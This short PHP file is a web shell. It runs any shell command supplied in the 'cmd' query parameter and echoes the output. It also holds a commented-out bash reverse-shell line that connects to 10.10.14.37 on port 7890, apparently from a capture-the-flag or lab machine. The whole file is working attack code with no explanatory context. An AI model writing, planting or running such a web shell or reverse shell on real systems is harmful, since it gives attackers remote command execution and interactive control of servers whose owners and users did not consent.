<?php
//	echo("Y33ted: rshell setup by someone else");
//	exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.37/7890 0>&1'");
	$output = shell_exec($_GET["cmd"]);
	echo "<pre>$output</pre>";

?>
